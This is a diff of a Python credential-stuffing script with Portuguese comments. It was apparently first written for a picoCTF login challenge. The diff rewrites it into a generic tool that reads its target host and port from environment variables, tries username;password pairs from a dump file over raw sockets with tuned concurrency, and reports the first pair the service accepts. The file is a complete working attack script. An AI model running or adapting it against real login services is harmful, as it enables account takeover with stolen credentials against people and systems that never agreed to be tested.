@@ -1,137 +1,66 @@
 #!/usr/bin/env python3
-from pwn import *
+# Credential stuffing contra o serviço de login por socket.
+#
+# Calibração importante: o serviço aceita só ~3-4 conexões simultâneas; com mais
+# que isso TODAS as conexões são recusadas (erro). Por isso WORKERS=4. Também
+# mando usuário e senha na mesma escrita (o serviço lê duas linhas em sequência),
+# cortando round-trips. Para na primeira resposta que NÃO contém "Invalid".
+#
+# Uso: TARGET_HOST=host TARGET_PORT=porta python3 scripts/script1.py
+
+import socket, os
 from concurrent.futures import ThreadPoolExecutor, as_completed
-import threading
-import re
-import time
 
-# Instância atual do desafio
-HOST = "crystal-peak.picoctf.net"
-PORT = 52170
+HOST = os.environ.get("TARGET_HOST", "xebec.cylabacademy.net")
+PORT = int(os.environ.get("TARGET_PORT", "10001"))
+CREDS_FILE = "files/creds-dump.txt"
+WORKERS = 4  # o serviço recusa conexões com concorrência alta
 
-# Dump fornecido pelo desafio
-CREDS_FILE = "creds-dump.txt"
+FOUND = {}
 
-# Pela calibração anterior, 10 workers está estável:
-# invalid=250 incomplete=0 error=0
-WORKERS = 10
-
-context.log_level = "error"
-
-found_event = threading.Event()
-
-def try_login(index, username, password):
-    """
-    Testa uma credencial contra o serviço.
-
-    A lógica segue o writeup:
-    1. conecta no serviço
-    2. espera Username:
-    3. envia usuário
-    4. espera Password:
-    5. envia senha
-    6. lê a resposta
-    7. procura picoCTF{
-    """
-    if found_event.is_set():
+def try_login(up):
+    if FOUND:
         return None
-
+    u, p = up
     try:
-        io = remote(HOST, PORT, timeout=5)
-
-        io.sendlineafter(b"Username:", username.encode("utf-8"), timeout=5)
-        io.sendlineafter(b"Password:", password.encode("utf-8"), timeout=5)
-
-        # Timeout um pouco maior que o writeup para não cortar a flag
-        result = io.recvall(timeout=2)
-
-        io.close()
-
-        if b"picoCTF{" in result:
-            found_event.set()
-
-            text = result.decode("utf-8", errors="replace")
-
-            return {
-                "index": index,
-                "username": username,
-                "password": password,
-                "response": text
-            }
-
-        return None
-
+        s = socket.create_connection((HOST, PORT), timeout=8)
+        s.settimeout(6)
+        s.sendall(u.encode() + b"\n" + p.encode() + b"\n")  # Username + Password juntos
+        data = b""
+        for _ in range(10):
+            d = s.recv(4096)
+            if not d:
+                break
+            data += d
+            if b"}" in data or b"Invalid" in data:
+                break
+        s.close()
+        r = data.decode(errors="replace")
+        if "Invalid" not in r and r.strip():
+            return (u, p, r)
     except Exception:
         return None
+    return None
 
 def main():
     creds = []
-
-    with open(CREDS_FILE, "r", encoding="utf-8", errors="replace") as f:
+    with open(CREDS_FILE, encoding="utf-8", errors="replace") as f:
         for line in f:
             line = line.strip()
-
-            if not line or ";" not in line:
-                continue
-
-            # split(';', 1) evita erro caso a senha tenha ';'
-            username, password = line.split(";", 1)
-            creds.append((username, password))
-
-    print(f"[*] Total de credenciais: {len(creds)}")
-    print(f"[*] Host: {HOST}")
-    print(f"[*] Porta: {PORT}")
-    print(f"[*] Workers: {WORKERS}")
-    print("[*] Procurando picoCTF{ na resposta pós-login...\n")
-
-    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
-        futures = []
-
-        for index, (username, password) in enumerate(creds, start=1):
-            if found_event.is_set():
-                break
-
-            futures.append(
-                executor.submit(
-                    try_login,
-                    index,
-                    username,
-                    password
-                )
-            )
-
-            if index % 100 == 0:
-                print(f"[*] Enfileiradas: {index}/{len(creds)}")
-
-            # Pequeno espaçamento para não matar a instância
-            time.sleep(0.01)
-
-        for future in as_completed(futures):
-            result = future.result()
-
-            if result:
-                print("\n[+] FLAG ENCONTRADA!")
-                print(f"[+] Posição no dump: {result['index']}")
-                print(f"[+] Username: {result['username']}")
-                print(f"[+] Password: {result['password']}")
-
-                print("\n========== RESPOSTA DO SERVIDOR ==========")
-                print(result["response"])
-                print("==========================================")
-
-                match = re.search(r"picoCTF\{[^}]+\}", result["response"])
-                if match:
-                    print(f"\n[+] FLAG LIMPA: {match.group(0)}")
-
-                with open("flag.txt", "w", encoding="utf-8") as out:
-                    if match:
-                        out.write(match.group(0) + "\n")
-                    out.write("\n")
-                    out.write(result["response"])
-
+            if line and ";" in line:
+                u, p = line.split(";", 1)  # senha pode conter ';'
+                creds.append((u, p))
+    print(f"[*] {len(creds)} credenciais, {WORKERS} workers, alvo {HOST}:{PORT}")
+    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
+        futs = {ex.submit(try_login, up): up for up in creds}
+        for fut in as_completed(futs):
+            r = fut.result()
+            if r:
+                FOUND["hit"] = r
+                print(f"\n[+] par válido: {r[0]}:{r[1]}")
+                print(r[2])
                 return
-
-    print("\n[-] Nenhuma flag encontrada.")
+    print("[-] nenhum par válido encontrado (dump não corresponde a esta instância?)")
 
 if __name__ == "__main__":
     main()
